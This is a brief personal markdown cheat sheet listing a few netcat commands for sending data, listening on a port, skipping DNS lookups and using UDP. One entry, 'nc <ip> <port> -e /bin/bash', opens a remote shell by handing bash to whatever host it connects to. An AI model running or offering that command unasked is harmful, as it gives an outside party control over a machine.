# All of my used comamnds in netcat

* ```echo hello | nc <ip> <port>``` send the output of echo by tcp packets to the specified ip and port
* ```nc <ip> <port> -e /bin/bash``` specify which program to execute after connect to a host
* ```nc -l -p <port>``` Listen for incoming packets from the specified port
* ```nc -l -n -p <port>``` Do not do any DNS or service lookups on any specified addresses, hostnames or ports while listening
* ```nc -u``` use UDP packets instead of tcp